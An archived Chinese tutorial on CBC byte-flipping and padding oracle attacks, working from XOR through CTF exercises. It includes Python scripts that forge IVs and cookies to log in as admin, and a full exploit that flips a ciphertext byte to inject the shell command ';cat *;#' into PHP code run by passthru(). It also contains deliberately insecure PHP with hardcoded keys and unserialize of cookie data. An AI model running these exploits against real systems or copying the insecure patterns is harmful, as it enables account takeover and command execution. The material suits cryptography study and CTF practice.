---
title: "CBC Bit Flipping and Padding Oracles"
title_zh: "CBC 字节翻转与 Padding Oracle"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: CBC Byte Flipping Attack
date: 2020-06-29 11:55:00
slug: CBC-Byte-Flipping-Attack
permalink: writing/CBC-Byte-Flipping-Attack/
topic: Application security
summary: "Working through XOR, intermediate values and the conditions behind two cryptographic attack patterns."
summary_zh: "从异或关系、分组加解密和中间值出发，推导字节翻转与填充预言的联系，并通过PHP练习分析受损分组、初始化向量修复及攻击成立的前提。"
format_label: Technical notes
featured_rank: 8
missing_images: 16
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## 0x01 什么是CBC字节翻转

> **通过损坏密文字节来改变明文字节**。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。

CBC全称Cipher Block Chaining模式（密文分组链接模式），“分组“是指加密和解密过程都是以分组进行的。

每一个分组大小为128bits(16字节)，如果明文的长度不是16字节的整数倍，需要对最后一个分组进行填充(padding)，使得最后一个分组长度为16字节。

“链接”是指密文分组分组像链条一样相互连接在一起。

## 0x02 异或运算（XOR）

计算机存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1，例如:

```c
0101 XOR 0110 = 0011
65 XOR 42 = 107(十进制数先转为二进制再进行异或操作）
```

字符在计算机中有对应的``ascii `码值，对字符进行异或运算就是将两串字符对应的ascii码值相异或把得到的`ascii`码值对应的字符相异或，异或运算具有可逆性，如

```c
65 XOR 42 = 107 则 107 XOR 42 = 65
```

因此对于异或运算 `a XOR b = c`，我们只需知道``abc `中的任意两个，将这两个相异或便可求出第三个，这个性质也是我们进行`padding oracle attack`的关键。

> 当我们的一个值C是由A和B异或得到
> C = A XOR B
> 那么
> A XOR B XOR C很明显是=0的
> 当我们知道B和C之后，想要得到A的值也很容易
> A = B XOR C
> 因此，A XOR B XOR C等于0。
>
> 有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。

## 0x03 CBC加密模式

**简述**

CBC是一种加密的模式，经常把DES或者AES算法（两种分组密码算法）作为加密使用的算法。

所谓分组加密顾名思义，就是按一定规则把明文分成一块一块的小组，DES分组长度是八字节而AES分组长度是十六字节，每组长度一致，加密时是按组进行加密的。

加密时，第一个明文分组，需要通过和IV(初始化向量)进行异或处理之后，才可以进行加密处理

每一个明文分组(除了第一个明文分组)加密之前都需要和前一个密文分组进行异或处理之后，才可以进行加密处理

### 3.1 加密公式

**高数公式:**

![历史配图暂缺](redacted-image:missing)

**民间自创:**

- *Ciphertext-0 = Encrypt(Plaintext XOR IV)*—只用于第一个组块
- *Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)*—用于第二及剩下的组块

### 3.2 加密过程

![历史配图暂缺](redacted-image:missing)

- **Plaintext**：待加密的数据。
- **IV**：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
- **Key**：被一些如AES的对称加密算法使用。
- **Ciphertext**：加密后的数据。

**过程**

- 将明文的第一个分组与IV进行异或，送入加密模块进行加密，得到第一个密文分组
- 从第二个明文分组开始，将明文分组与前一个密文分组进行异或
- 将第2步得到的结果送入加密模块进行加密
- 将每一个密文分组拼接起来形成密文

**理解**

- 首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。
- 生成一个随机的初始化向量(IV)和一个密钥。
- 将IV和第一组明文异或。
- 用密钥对3中xor后产生的密文加密。
- 用4中产生的密文对第二组明文进行xor操作。
- 用密钥对5中产生的密文加密。
- 重复4-7，到最后一组明文。
- 将IV和加密后的密文拼接在一起，得到最终的密文。

**特性**

从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：

> CBC工作于一个固定长度的比特组，将其称之为*块*。
>
> ***前一块的密文用来产生后一块的密文。***

**总述**

```c
1.对明文进行分组，使每组长度相同（通常为 8 或 16 字节，取决于加密算法），对长度不足的分组进行填充，通常，填充遵循的是 PKCS#5 标准，即填充的字符即为需要填充的字符的个数（十六进制表示）
2.随机生成一个 Initialization Vector（IV），将第一个明文分组与 IV 作异或运算
3.将 2 的结果进行加密，得到第一个明文分组的密文
4.从第二个明文分组开始，先将明文分组与上一组的密文作异或运算，再将结果进行加密，得到该分组的密文
5.将IV和这n块密文连在一起便得到了明文用CBC模式加密后的密文。
```

## 0x04 CBC解密模式

**简述**

第一个密文分组，解密之后，需要通过和IV进行异或处理，才可以得到第一个明文分组

每一个密文分组（除第一个密文分组外）经过解密处理之后，都需要和前一个密文分组进行异或处理，才可以得到对应的明文分组

### 4.1 解密公式

**高数公式:**

![历史配图暂缺](redacted-image:missing)

**民间自创:**

> **Ciphertext-N-1（密文-N-1）是用来产生下一块明文**；这就是字节翻转攻击开始发挥作用的地方。
>
> 如果我们改变*Ciphertext-N-1*（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！

- *Plaintext-0 = Decrypt(Ciphertext) XOR IV*—只用于第一个组块
- *Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1*—用于第二及剩下的组块

### 4.2 解密过程

![历史配图暂缺](redacted-image:missing)

- **Plaintext**：待加密的数据。
- **IV**：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
- **Key**：被一些如AES的对称加密算法使用。
- **Ciphertext**：加密后的数据。

**过程**

- 将密文的第一个分组进行解密，得到的结果与IV进行异或处理，得到第一个明文分组。
- 从第二个密文分组开始，先对每一个密文分组进行解密处理，到第3步。
- 将第2步得到的结果与前一个密文分组进行异或处理，得到对应的明文分组。
- 将每一个明文分组拼接在一块，便得到原先的明文。

**理解**

- 从密文中提取出IV，然后将密文分组。
- 使用密钥对第一组的密文解密，然后和IV进行xor得到明文。
- 使用密钥对第二组密文解密，然后和2中的密文xor得到明文。
- 重复2-3，直到最后一组密文。

**特性**

解密过程，解密的过程其实只要理解了加密，反过来看解密过程就也很简单了，同样的：

> CBC工作于一个固定长度的比特组，将其称之为*块*。
>
> ***前一块密文参与下一块密文的还原***。

**总述**

```c
1.首先按照一定长度将密文分好组，其中密文的第一组是初始的IV值，第二组密文对应第一组明文。
2.分好组后，从第二组密文开始依次用算法进行解密运算得到n组中间值，这时候得到的值并不是明文，要想得到明文还需进行一次异或操
作，第一个中间值与初始IV值异或得到明文，第二个中间值与前一组的密文异或得到第二组明文，以此类推最后一组中间值与倒数第二组密
文进行亦或便可得到最后一组明文，将所有的明文连在一起便是最终的明文。
```

## 0x05 CBC字节翻转攻击

### 5.1 攻击原理

![历史配图暂缺](redacted-image:missing)

以第一个分组为例：
**加密过程：**

**将原明文称为sourceStr，**

**初始IV称为old_IV,**

**sourceStr^old_IV得到中间值middlecipher。**

**middlecipher经过分组加密算法(aes,des)得到第一组密文。**

**解密过程：**

**第一组密文经分组解密算法得到中间值middlecipher，**

**middlecipher^old_IV得到原明文sourceStr。**

同理正常解密过程 `sourceStr=middlecipher^old_IV`

我们希望通过提交构造的``evil_IV `得到我们想要的解密明文`targeStr`，

也就是 `targeStr=middlecipher^evil_IV`

而得到evil_IV的方式为:`evil_IV=middlecipher^targeStr`

但是需要知道``middlecipher`

由上面可知中心为``middlecipher`，

只要得到了 `middlecipher`就可以构造出 `evil_IV`。

因为 `sourceStr=middlecipher^old_IV`

所以知道了明文 `sourceStr`和 `old_IV`就能异或出 `middlecipher`。

即 `evil_IV=old_IV^sourceStr^targetStr`

### 5.2 POC

> 这是在知道明文和IV的情况下并可以提交我们构造的IV的情况下,我们可改变第一个明文分组的值

**已知明文sourceStr和old_IV可以构造Evil-IV来改变明文为目标明文targetStr（这里只能改变第一个分组）。**

```python
import os
import codecs
from Crypto.Cipher import AES
from Crypto import Random
SECRET_KEY=codecs.encode(os.urandom(8),'hex_codec').upper() #16byte密钥
IV=Random.new().read(16)    #16byte初始向量

sourceStr='hello,world'
aes = AES.new(SECRET_KEY,AES.MODE_CBC,IV)
length = 16
count = len(sourceStr)
add = length - (count % length)
sourceStr = sourceStr + (chr(0) * add) #正常情况下这里应该是补\x05 5由16-11得来，但由于我省事不想处理结果后面出现的乱码，就省事改为\x00了
cipher=aes.encrypt(sourceStr)
print("明文为:",sourceStr)
print("秘钥为:",SECRET_KEY)
print("IV为：",IV)
# print("明文序列为:",list(sourceStr))
print("密文为:",aes.encrypt(sourceStr))

old_IVList=[]
sourceStrList=[]
for i in range(0,len(codecs.encode(IV,'hex_codec').decode()),2):
    old_IVList.append(int(codecs.encode(IV,'hex_codec').decode()[i:i+2],16))
evil_IVList=old_IVList
for i in list(sourceStr):
    sourceStrList.append(ord(i))

evil_IVList[9]=sourceStrList[9]^old_IVList[9]^0  #让第10位消失
evil_IVList[10]=sourceStrList[10]^old_IVList[10]^ord('D')  #让解出来的明文第11位为D
evil_IVList[11]=sourceStrList[11]^old_IVList[11]^ord('!')  #再加个!
evil_IV=''

for i in evil_IVList:
    if len(hex(i)[2:])==1:  #为了保证构造出来的IV是16byte,1位的16进制补0变成2位
        evil_IV+='0'+hex(i)[2:]
    else:
        evil_IV += hex(i)[2:]
evil_IV=codecs.decode(evil_IV,'hex_codec')  #恶意构造的16byte IV
print("恶意构造出的IV:",evil_IV)
aes = AES.new(SECRET_KEY,AES.MODE_CBC,evil_IV)
dsc=aes.decrypt(cipher).decode()
print("利用恶意构造的IV结出来的明文:",dsc)
```

![历史配图暂缺](redacted-image:missing)

### 5.3 一个例子

比方说，我们有这样的明文序列：

```json
a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}
```

我们的目标是将“`s:6`”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成``16`个字节的块：

- Block 1:`a:2:{s:4:"name";`
- Block 2:`s:6:"sdsdsd";s:8`
- Block 3:`:"greeting";s:20`
- Block 4:`:"echo 'Hello sd`
- Block 5:`sdsd!'";}`

因此，我们的目标字符位于块2，这意味着我们需要改变块1的密文来改变第二块的明文。

有一条经验法则是：

> 你在密文中改变的字节，**只**会影响到在下一明文当中，具有相同偏移量的字节。

所以我们目标的偏移量是2：

- [0] = s
- [1](http://drops.wooyun.org/wp-content/uploads/2015/08/115.png) = :
- [2](http://drops.wooyun.org/wp-content/uploads/2015/08/216.png) =6

因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。

1. `$v = "a:2:{s:4:"name";s:6:"sdsdsd";s:8:"greeting";s:20:"echo 'Hello sdsdsd!'";}";`
2. `$enc = @encrypt($v);`
3. `$enc[2] = chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));`
4. `$b = @decrypt($enc);`

运行这段代码后，我们可以将数字6变为7：



但是我们在第3行中，是如何改变字节成为我们想要的值呢？

基于上述的解密过程，我们知道有，*A = Decrypt(Ciphertext)*与*B = Ciphertext-N-1*异或后最终得到*C = 6*。等价于：

```php
C = A XOR B
```

所以，我们唯一不知道的值就是A（注：对于B，C来说）（*block cipher decryption*）;借由XOR，我们可以很轻易地得到A的值：

```php
A = B XOR C
```

最后，A XOR B XOR C等于0。

有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，就像这样：

`A XOR B XOR C XOR "7"`会在块2的明文当中，偏移量为2的字节处得到7。

下面是相关原理实现的PHP源代码：

```php
#!php
define('MY_AES_KEY', "abcdef0123456789");
function aes($data, $encrypt) {
    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
    $iv = "1234567891234567";
    mcrypt_generic_init($aes, MY_AES_KEY, $iv);
    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);
}

define('MY_MAC_LEN', 40);

function encrypt($data) {
    return aes($data, true);
}

function decrypt($data) {
    $data = rtrim(aes($data, false), "\0");
    return $data;
}
$v = "a:2:{s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";}";
echo "Plaintext before attack: $v\n";
$b = array();
$enc = array();
$enc = @encrypt($v);
$enc[2] =  chr(ord($enc[2]) ^ ord("6") ^ ord ("7"));
$b = @decrypt($enc);
echo "Plaintext AFTER attack : $b\n";
```

## 0x06 padding oracle攻击原理

### 6.1 概要

padding oracle是用来获取明文source_Str的，

但更准确的说应该是获取中间值middlecipher的。

获取了中间值之后，如果我们知道了初始IV和密文cipher后，

就可以得到明文sourceStr（`sourceStr=middlecipher^old_IV`）

然后我们就可以进行CBC字节翻转攻击

### 6.2 详解

CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit=16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，

CBC加密模式要对明文进行分组(通常为8或16字节，取决于算法，比如AES-128-CBC就是16字节,128bit=16byte),CBC分组遵循PKCS#5标准，填充的字符为余下字节的个数。用8byte分组做例子的话，如下图，需注意即便分组内容能正好平均分为n组，仍需要在最后一组后面填充一个八位分组，![历史配图暂缺](redacted-image:missing)

### 6.3 服务器判断过程

假设我们向服务器提交了正确的密码，我们的密码在经过CBC模式加密后传给

了服务器，这时服务器会对我们传来的信息尝试解密，如果可以正常解密会返

回一个值表示正确，如果不能正常解密则会返回一个值表示错误。而事实上，

判断提交的密文能不能正常解密，第一步就是判断密文最后一组的填充值是否

正确，也就是观察最后一组解密得到的结果的最后几位，如果错误将直接返回

错误，如果正确，再将解密后的结果与服务器存储的结果比对，判断是不是正

确的用户。也就是说服务器一共可能有三种判断结果：

- 如果参数是完全正确的，身份认证成功，返回 HTTP 200 OK，提示认证成功(也就是解密的明文正确)
- 如果参数是可以解密为正确格式的明文的密文（明文 Padding 等正确），但是身份认证失败，返回 HTTP 200 OK，提示认证失败（只有padding格式正确，我们主要利用这一点）
- 如果参数不是可以解密为正确格式的明文的密文（明文的 Padding 错误等），服务器内部抛出异常，返回 HTTP 500 Internal Server Error
- 其中第一种情况与第二 三种情况的返回值一定不一样，这就给了我们可乘之机——我们可以利用服务器的返回值判断我们提交的内容能不能正常解密，进一步讲，我们可以知道最后一组密文的填充位符不符合填充标准。

### 6.4 padding oracle attack核心

![历史配图暂缺](redacted-image:missing)

如上图所示，明文填充了四位时，如果最后一组密文解密后的结果

（Intermediary Value也就是中间值）与前一组密文（Initialization Vector也就是IV值）异或得到的最后四位是0×04，那么服务器就会返回可以正常解密。

CBC模式的解密过程，第n组密文解密后的中间值与前一组的密文异或便可得到

明文，现在我们不知道解密的密钥key，但我们知道所有的密文，因此只要我们

能够得到中间值便可以得到正确的明文（进行一次异或运算便可），而中间值

是由服务器解密得到的，因此我们虽然不知道怎么解密但我们可以利用服务器

帮我们解密，我们所要做的是能确定我们得到的中间值是正确的，这也是

padding oracle attack的核心——找出正确的中间值。

- (1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；
- (2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0×00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0×01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0×01![历史配图暂缺](redacted-image:missing)
- （3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0×01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，二就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0×01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；![历史配图暂缺](redacted-image:missing)
- （4）再假定明文填充了两字节也就是明文最后两字节是0×02，接着构造倒数第二组密文，我们把M1与0×02异或可以得到填充两字节时密文
  的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0×00到0xff），当服务器返回值表示可以正常解密时
  ，我们把此时的倒数第二位密文的取值与0×02异或便可得到最后一组密文倒数第二字节对应的中间值；
- （5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的倒数第二组密文异或便可得到最后一组分组的明文；
- （6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，以此类推，最后我们便
  可以得到全部的明文

### 6.5 攻击成立的条件

攻击成立的两个重要假设前提:

- 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）
- 攻击者能够触发密文的解密过程，且能够知道密文的解密结果（是否是正常解密）

## 0x07 运用(参考)

```php
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();

function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}

function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo $flag;
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}

if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
```

1.如果username===admin就输出flag，但是禁止了admin登陆。
2.把username和password构造为一个数组，然后进行序列化，并对这个序列化对象进行aes-128-cbc加密，iv值为16位随机数。加密值赋值给cipher。
[openssl_encrypt()函数](http://php.net/manual/zh/function.openssl-encrypt.php)
3.session[username]=username序列化并cbc加密后的值。对iv和cipher进行base64加密并设置了cookie
4.最后对cipher和iv进行base64解密。然后对cipher进行cbc解密，如果与原序列化对象值相等则对其进行反序列化，错误则报错 `die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>`。把反序列化后username值赋给session[username]。

上面就是整个过程。这里把登录的用户名及其密码存入数组，序列化后进行AES-CBC模式的加密，其中iv，和密文以cookie储存，可以控制，导致存在攻击的可能。
使用skctf登陆，因为翻转目标是admin5位，所以登陆的用户名最好也为5位。登陆后存入数组序列化后变为： `a:2:{s:8:"username";s:5:"skctf";s:8:"password";s:5:"skctf";}`![历史配图暂缺](redacted-image:missing)

1.首先将明文修改为16字节的四组：

```json
a:2:{s:8:"userna
me";s:5:"skctf";
s:8:"password";s
:5:"skctf";}
```

2.根据CBC攻击原理，只要修改第一组密文对应第二组'skctf'的位置的明文，就可以实现对第二组明文的改变。即第10-14位。（**我们抓包获得的cipher是所有加密后的密文，因此只要我们更改cipher中第10-14位就可以。因为第二组明文和第一组密文已知，则可以求出第二组的中间值。将中间值中对应的第10-14位和明文中的skctf进行异或则可以得到应该修改的cipher的第10-14位的值。**）![历史配图暂缺](redacted-image:missing)

3.下面是网上找的重新生成密文的脚本

```python
    # -*- coding: utf-8 -*-
    import base64
    cipher = 'EvX06IpeOJ9iTJ7J1L9iP7ymKC1Phg7KySWJP0ZbAtlwVMnniIkdvRH60+BY5g+8i0WKbQvgJIZVbGsQGTzH5A=='.decode('base64')
    old = "me\";s:5:\"skctf\";"
    new = "me\";s:5:\"admin\";"

    for i in xrange(16):
        cipher = cipher[:i] + chr(ord(cipher[i]) ^ ord(old[i]) ^ ord(new[i])) + cipher[i+1:]

    print cipher.encode('base64').strip()
```

![历史配图暂缺](redacted-image:missing)
用上面生成的密文修改cookie：cipher，访问，因为不能正常反序列化，所以报错返回一个cbc解密后的明文值。![历史配图暂缺](redacted-image:missing)
4.根据CBC解密原理，修改第一块的密文可以达到修改第二块明文的结果，但同时也破坏了第一块明文。所以我们需要修复被破坏的第一块明文。根据上面得到的破坏后的明文，让他与原来的IV进行异或得到第一组的中间值，然后用这个中间值去跟修补后的明文异或从而得到一个新的IV，提交这个新的IV和cipher即可得到flag。
可以利用下面的脚本重新生成IV：

```python
# -*- coding: utf-8 -*-
import base64

plain = 'uSb7VZM9bSikP7AiZD5F5m1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjQ6IjIzMzMiO30='.decode('base64')
iv = 'KvfyPMU0MPU2PalcPn3TwA=='.decode('base64')

old = plain[:16]
new = "a:2:{s:8:\"userna";
for i in xrange(16):
    iv = iv[:i] + chr(ord(iv[i]) ^ ord(old[i]) ^ ord(new[i])) + iv[i+1:]

print iv.encode('base64').strip()
```

用生成的新IV替换cookie中的IV
![历史配图暂缺](redacted-image:missing)

## 0x08 练习

下面是上面练习当中的PHP源码及exp：

**PHP code:**

```php
#!php
ini_set('display_errors',1);
error_reporting(E_ALL);

define('MY_AES_KEY', "abcdef0123456789");
define('MY_HMAC_KEY',"1234567890123456" );
#define("FLAG","CENSORED");

function aes($data, $encrypt) {
$aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
$iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($aes), MCRYPT_RAND);
$iv = "1234567891234567";
mcrypt_generic_init($aes, MY_AES_KEY, $iv);
return $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);
}

define('MY_MAC_LEN', 40);

function hmac($data) {
return hash_hmac('sha1', data, MY_HMAC_KEY);
}

function encrypt($data) {
return aes($data . hmac($data), true);
}

function decrypt($data) {
$data = rtrim(aes($data, false), "\0");
$mac = substr($data, -MY_MAC_LEN);
$data = substr($data, 0, -MY_MAC_LEN);
return hmac($data) === $mac ? $data : null;
}
$settings = array();
if (@$_COOKIE['settings']) {
echo @decrypt(base64_decode($_COOKIE['settings']));
$settings = unserialize(@decrypt(base64_decode($_COOKIE['settings'])));
}
if (@$_POST['name'] && is_string($_POST['name']) && strlen($_POST['name']) < 200) {
$settings = array(
'name' => $_POST['name'],
'greeting' => ('echo ' . escapeshellarg("Hello {$_POST['name']}!")),
);
setcookie('settings', base64_encode(@encrypt(serialize($settings))));
#setcookie('settings', serialize($settings));
}
$d = array();
if (@$settings['greeting']) {
passthru($settings['greeting']);
else {
echo "</pre>
<form action="\"?\"" method="\"POST\"">\n";
echo "
What is your name?

\n";
echo "<input type="\"text\"" name="\"name\"" />\n";
echo "<input type="\"submit\"" name="\"submit\"" value="\"Submit\"" />\n";
echo "</form>
<pre>
\n";
}
?>
```

其中，在POST提交参数"name"的任何文本值之后，应用程序则会对应输出"Hello"加上最后提交的文本。但是有两件事情发生在消息打印之前：

1. POST参数"name"值被PHP函数escapeshellarg()过滤（转换单引号，防止恶意命令注入），然后将其存储在Array->greeting当中，最后加密该值来产生cookie。
2. Array->greeting当中的内容被PHP函数passthru()执行。
3. 最后，在页面被访问的任何时间中，如果cookie已经存在，它会被解密，它的内容会通过passthru()函数执行。如前节所述，在这里CBC攻击会给我们一个不同的明文。

然后构造了一个POST"name"的值来注入字符串：

```php
name = 'X' + ';cat *;#a'
```

首先添加了一个字符"X"，通过CBC翻转攻击将其替换成一个单引号，

然后 `;cat *;`命令将被执行，

最后的 `#`是用来注释，确保函数escapeshellarg()插入的单引号不会引起其他问题；

因此我们的命令就被成功执行。

在计算好之前的密码块中，要被改变的字节的确切偏移量（51）后，通过下面的代码来注入单引号：

```php
pos = 51;
val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
exploit = cookie[0:pos] + val + cookie[pos + 1:]
```

然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：

[![历史配图暂缺](redacted-image:missing)

首先，因为我们改变了第一块，

所以在第二块中，黄色标记的"X"被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），

因此应用程序甚至都没有去尝试执行注入了。

**如何完善**

我们需要使我们的注入数据有效，那么我们在第一块中得到的额外数据，就不能在反序列化的过程中造成任何问题（unserialize()）。

一种方法是在我们的恶意命令中填充字母字符。因此我们尝试在注入字符串前后填充多个'z'：

```php
name = 'z'*17 + 'X' + ';cat *;#' + 'z'*16
```

在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行。

**Exploit:**

```python
#!python
#!/usr/bin/python
import requests
import sys
import urllib
from base64 import b64decode as dec
from base64 import b64encode as enc

url = 'http://192.0.2.20/ebctf/mine.php'

def Test(x):
    t = "echo 'Hello %s!'" % x
    s = 'a:2:{s:4:"name";s:%s:"%s";s:8:"greeting";s:%s:"%s";}%s' % (len(x),x,len(t),t, 'X'*40)
    for i in xrange(0,len(s),16):
        print s[i:i+16]
    print '\n'

def Pwn(s):
    global url
    s = urllib.quote_plus(enc(s))
    req = requests.get(url, cookies = {'settings' : s}).content
 #   if req.find('works') != -1:
    print req
  #  else:
   #     print '[-] FAIL'

def GetCookie(name):
    global url
    d = {
        'name':name,
        'submit':'Submit'
    }
    h = requests.post(url, data = d, headers = {'Content-Type' : 'application/x-www-form-urlencoded'}).headers
    if h.has_key('set-cookie'):
        h = dec(urllib.unquote_plus(h['set-cookie'][9:]))
        #h = urllib.unquote_plus(h['set-cookie'][9:])
        #print h
        return h
    else:
        print '[-] ERROR'
        sys.exit(0)

#a:2:{s:4:"name";s:10:"X;cat *;#a";s:8:"greeting";s:24:"echo 'Hello X;cat *;#a!'";}
#a:2:{s:4:"name";
#s:10:"X;cat *;#a
#";s:8:"greeting"
#;s:24:"echo 'Hel
#lo X;cat *;#a!'"
#;}

#a:2:{s:4:"name";s:42:"zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz";s:8:"greeting";s:56:"echo 'Hello zzzzzzzzzzzzzzzzzX;cat *;#zzzzzzzzzzzzzzzz!'";}
#a:2:{s:4:"name";
#s:42:"zzzzzzzzzz
#zzzzzzzX;cat *;#
#zzzzzzzzzzzzzzzz
#";s:8:"greeting"   
#;s:56:"echo 'Hel
#lo zzzzzzzzzzzzz
#zzzzX;cat *;#zzz
#zzzzzzzzzzzzz!'"
#;}
#exploit = 'X' + ';cat *;#a' #Test case first, unsuccess
exploit = 'z'*17 + 'X' + ';cat *;#' + 'z' *16 # Test Success

#exploit = "______________________________________________________; cat *;#"
#Test(exploit)
cookie = GetCookie(exploit)
pos = 100; #test case success
#pos = 51; #test case first, unsuccess
val = chr(ord('X') ^ ord("'") ^ ord(cookie[pos]))
exploit = cookie[0:pos] + val + cookie[pos + 1:]
Pwn(exploit)
```

## 0x09 参考

[Padding oracle attack详细解析](http://www.freebuf.com/articles/database/151167.html)[Padding Orlace](https://kuraraneko.github.io/2018/01/14/Padding-Orlace/)[CBC字节翻转攻击](http://p0sec.net/index.php/archives/99/)《CBC 字节翻转攻击—101 Approach》（原 Wooyun Drops 文章，旧镜像链接不公开）
